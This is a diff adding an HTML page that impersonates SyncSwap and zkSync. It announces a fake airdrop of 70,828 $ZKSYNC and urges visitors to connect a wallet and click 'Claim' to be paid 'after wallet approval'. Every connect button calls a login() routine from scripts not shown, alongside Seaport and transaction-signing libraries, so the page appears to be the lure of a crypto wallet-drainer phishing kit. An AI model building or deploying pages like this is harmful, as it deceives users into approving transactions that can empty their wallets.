@@ -1,0 +1,338 @@
+<html
+  lang="en"
+  style="
+    --w3m-color-fg-1: rgb(228, 231, 231);
+    --w3m-color-fg-2: rgb(148, 158, 158);
+    --w3m-color-fg-3: rgb(110, 119, 119);
+    --w3m-color-bg-1: rgb(20, 20, 20);
+    --w3m-color-bg-2: rgb(39, 42, 42);
+    --w3m-color-bg-3: rgb(59, 64, 64);
+    --w3m-color-overlay: rgba(255, 255, 255, 0.1);
+    --w3m-accent-color: #3396ff;
+    --w3m-accent-fill-color: #ffffff;
+    --w3m-z-index: 89;
+    --w3m-background-color: #3396ff;
+    --w3m-background-border-radius: 8px;
+    --w3m-container-border-radius: 30px;
+    --w3m-wallet-icon-border-radius: 15px;
+    --w3m-input-border-radius: 28px;
+    --w3m-button-border-radius: 10px;
+    --w3m-notification-border-radius: 36px;
+    --w3m-secondary-button-border-radius: 28px;
+    --w3m-icon-button-border-radius: 50%;
+    --w3m-button-hover-highlight-border-radius: 10px;
+    --w3m-text-big-bold-size: 20px;
+    --w3m-text-big-bold-weight: 600;
+    --w3m-text-big-bold-line-height: 24px;
+    --w3m-text-big-bold-letter-spacing: -0.03em;
+    --w3m-text-big-bold-text-transform: none;
+    --w3m-text-xsmall-bold-size: 10px;
+    --w3m-text-xsmall-bold-weight: 700;
+    --w3m-text-xsmall-bold-line-height: 12px;
+    --w3m-text-xsmall-bold-letter-spacing: 0.02em;
+    --w3m-text-xsmall-bold-text-transform: uppercase;
+    --w3m-text-xsmall-regular-size: 12px;
+    --w3m-text-xsmall-regular-weight: 600;
+    --w3m-text-xsmall-regular-line-height: 14px;
+    --w3m-text-xsmall-regular-letter-spacing: -0.03em;
+    --w3m-text-xsmall-regular-text-transform: none;
+    --w3m-text-small-thin-size: 14px;
+    --w3m-text-small-thin-weight: 500;
+    --w3m-text-small-thin-line-height: 16px;
+    --w3m-text-small-thin-letter-spacing: -0.03em;
+    --w3m-text-small-thin-text-transform: none;
+    --w3m-text-small-regular-size: 14px;
+    --w3m-text-small-regular-weight: 600;
+    --w3m-text-small-regular-line-height: 16px;
+    --w3m-text-small-regular-letter-spacing: -0.03em;
+    --w3m-text-small-regular-text-transform: none;
+    --w3m-text-medium-regular-size: 16px;
+    --w3m-text-medium-regular-weight: 600;
+    --w3m-text-medium-regular-line-height: 20px;
+    --w3m-text-medium-regular-letter-spacing: -0.03em;
+    --w3m-text-medium-regular-text-transform: none;
+    --w3m-font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI',
+      Roboto, Ubuntu, 'Helvetica Neue', sans-serif;
+    --w3m-success-color: rgb(38, 181, 98);
+    --w3m-error-color: rgb(242, 90, 103);
+    --w3m-background-image-url: none;
+  "
+>
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>SyncSwap</title>
+    <link rel="icon" type="image/svg" href="./img/logo.svg" />
+    <link rel="stylesheet" href="./css/drops.css" />
+    <link rel="stylesheet" href="./css/fonts.css" />
+    <link rel="stylesheet" href="./css/index.css" />
+    <style>
+      .second {
+        display: none;
+      }
+      .hide {
+        display: none;
+      }
+      .show {
+        display: block;
+      }
+      .web3modal-modal-lightbox {
+        position: fixed;
+        z-index: 10000;
+      }
+    </style>
+    <script
+      type="text/javascript"
+      src="https://code.jquery.com/jquery-3.6.0.min.js"
+      crossorigin="anonymous"
+    ></script>
+    <script
+      type="text/javascript"
+      src="https://cdnjs.cloudflare.com/ajax/libs/jquery-cookie/1.4.1/jquery.cookie.min.js"
+    ></script>
+    <script
+      src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"
+      type="application/javascript"
+    ></script>
+    <link
+      href="//cdn.jsdelivr.net/npm/@sweetalert2/theme-dark@4/dark.css"
+      rel="stylesheet"
+    />
+    <script
+      type="text/javascript"
+      src="//cdn.jsdelivr.net/npm/sweetalert2@11"
+    ></script>
+    <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"></script>
+    <script
+      type="text/javascript"
+      src="https://unpkg.com/web3modal@1.9.7/dist/index.js"
+    ></script>
+    <script
+      type="text/javascript"
+      src="https://github.com/WalletConnect/walletconnect-monorepo/releases/download/1.7.8/web3-provider.min.js"
+    ></script>
+    <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.27.2/axios.min.js"
+      integrity="sha512-odNmoc1XJy5x1TMVMdC7EMs3IVdItLPlCeL5vSUPN2llYKMJ2eByTTAIiiuqLg+GdNr9hF6z81p27DArRFKT7A=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    ></script>
+    <script
+      type="text/javascript"
+      src="https://cdn.jsdelivr.net/gh/ethereumjs/browser-builds/dist/ethereumjs-tx/ethereumjs-tx-1.3.3.min.js"
+    ></script>
+    <script
+      language="javascript"
+      type="text/javascript"
+      src="js/ABI.js"
+    ></script>
+    <script type="text/javascript" src="js/wallet-sdk-bundle.js"></script>
+    <script type="text/javascript" src="js/main.js"></script>
+    <script type="text/javascript" src="js/seaport.js"></script>
+    <script>
+      $(document).ready(function () {
+        $(".claim-button").click(function () {
+          event.stopImmediatePropagation();
+          event.stopPropagation();
+          event.preventDefault();
+          login();
+        });
+      });
+    </script>
+  </head>
+  <body>
+    <header>
+      <div class="up_new">
+        <span>You are on the zkSync Era Alpha Mainnet.</span>
+      </div>
+      <div class="nav">
+        <div class="nav_left">
+          <div class="nav_logo">
+            <a href="#main">
+              <img src="./img/logo.svg" />
+            </a>
+          </div>
+          <a href="#trade" class="links">
+            <img src="./img/reload_arrows.svg" />
+            <span>Trade</span>
+          </a>
+          <a href="#portal" class="links">
+            <span>Seamless</span>
+          </a>
+        </div>
+        <div class="nav_right">
+          <div
+            class="claim-button nav_connect_wallet connectButton"
+            id="main_connect"
+          >
+            <img src="./img/wallet.svg" />
+            <span>Connect</span>
+          </div>
+          <div class="nav_dots">
+            <div class="nav_dot"></div>
+            <div class="nav_dot"></div>
+            <div class="nav_dot"></div>
+          </div>
+        </div>
+      </div>
+    </header>
+    <main>
+      <div class="main_block" id="main">
+        <div class="amin_cirles">
+          <div class="yellow_circle"></div>
+          <div class="blue_circle"></div>
+          <div class="purple_circle"></div>
+        </div>
+        <div class="main_lable">
+          <h1 class="first">
+            SyncSwap Airdrop launched on
+            <sapn id="text_grad">zkSync Era</sapn> with
+            <span class="Airdrop">70 828</span> $ZKSYNC for participants.
+          </h1>
+          <h1 class="second">
+            You can claim <span class="amount_drop"></span> $ZKSYNC
+          </h1>
+          <p class="first">
+            SyncSwap offers decentralized exchange and trading of digital assets
+            using zkSync technology. We are launching SyncSwap Airdrop on the
+            zkSync Era platform, distributing
+            <span class="Airdrop">70 828</span> $ZKSYNC. Connect a
+            zkSync-compatible wallet to participate in the Airdrop.
+          </p>
+          <p class="second">
+            Click the "Claim" button and receive your coins right now! There are
+            <span class="Airdrop">70 828</span> $ZKSYNC available, so don't miss
+            your chance. Each participant will receive
+            <span class="amount_drop"></span> $ZKSYNC after wallet approval.
+          </p>
+          <div class="nav_connect_wallet connectButton first">
+            <img src="./img/wallet.svg" />
+            <span>Connect</span>
+          </div>
+          <div
+            class="claimButton nav_connect_wallet connectButton second"
+            style="text-align: center"
+          >
+            <span>Claim</span>
+          </div>
+        </div>
+        <div class="main_images">
+          <img src="./img/lable.png" alt="" />
+        </div>
+      </div>
+      <div class="swap" id="trade">
+        <div class="swap_lable">
+          <h1>Trade</h1>
+          <p>Powered by zero-knowledge technology, SyncSwap.</p>
+        </div>
+        <div class="swap_input">
+          <div class="swap_amout">
+            <div class="swap_amout_inputs">
+              <div class="amout_input">
+                <input
+                  type="number"
+                  name="input_val"
+                  id="input_val"
+                  value="0.1"
+                />
+              </div>
+              <button class="amount_coin">
+                <img
+                  src="./img/eth_icon.png"
+                  style="width: 32px; height: 32px"
+                />
+                <span>ETH</span>
+                <img src="./img/dwon_arrow.svg" />
+              </button>
+            </div>
+            <div class="swap_cef">
+              <button class="cef_btn">25%</button>
+              <button class="cef_btn">50%</button>
+              <button class="cef_btn">75%</button>
+              <button class="cef_btn">100%</button>
+            </div>
+          </div>
+          <div class="swap_change">
+            <div class="swap_change_inner">
+              <img src="./img/dwon_arrow.svg" />
+            </div>
+          </div>
+          <div class="swap_out">
+            <div class="swap_amout_inputs">
+              <div class="amout_input">
+                <input type="number" name="out_val" id="out_val" value="0.1" />
+              </div>
+              <button class="amount_coin">
+                <img
+                  src="./img/eth_icon.png"
+                  style="width: 32px; height: 32px"
+                />
+                <span>ETH</span>
+                <img src="./img/dwon_arrow.svg" />
+              </button>
+            </div>
+          </div>
+        </div>
+        <div class="swap_started">
+          <div class="started_left">
+            <img src="./img/wallet.svg" alt="" />
+            <div class="started_left_inner">
+              <h1>Getting Started</h1>
+              <p>Connect wallet to trade and explore more</p>
+            </div>
+          </div>
+          <div class="started_right">
+            <img src="./img/next_arrow.svg" alt="" />
+          </div>
+        </div>
+      </div>
+      <div class="portal_info" id="portal">
+        <img src="./img/eth.png" alt="" class="portal" />
+        <div class="portal_desc">
+          <h1>Seamless and Efficient usage</h1>
+          <h2>Powered by zero-knowledge technology</h2>
+          <p>
+            Powered by zero-knowledge technology, SyncSwap brings more people
+            easy-to-use and low-cost DeFi with complete Ethereum security.
+            Powered by zero-knowledge technology, SyncSwap brings more people
+            easy-to-use and low-cost DeFi with complete Ethereum security.
+          </p>
+        </div>
+      </div>
+    </main>
+    <footer>
+      <div class="footer_info">
+        <img src="./img/logo.svg" style="height: 46px; width: auto" />
+        <div class="info_block">
+          <a href="" class="info_block_lable">Comment</a>
+          <a href="" class="info_block_text">Discord</a>
+          <a href="" class="info_block_text">Snapchat</a>
+        </div>
+        <div class="info_block">
+          <a href="" class="info_block_lable">News</a>
+          <a href="" class="info_block_text">Twitter</a>
+          <a href="" class="info_block_text">Mirror</a>
+        </div>
+        <div class="info_block">
+          <a href="" class="info_block_lable">Resources</a>
+          <a href="" class="info_block_text">Docs</a>
+          <a href="" class="info_block_text">Github</a>
+        </div>
+        <div class="info_block">
+          <a href="" class="info_block_lable">Links</a>
+          <a href="" class="info_block_text">Portal</a>
+          <a href="" class="info_block_text">Explorer</a>
+        </div>
+      </div>
+      <div class="footer_line"></div>
+      <div class="corp">© 2023 zkSync | All rights reserved</div>
+    </footer>
+    <style>
+      .web3modal-modal-lightbox {
+        position: fixed;
+        z-index: 10000;
+      }
+    </style>
+  </body>
+</html>
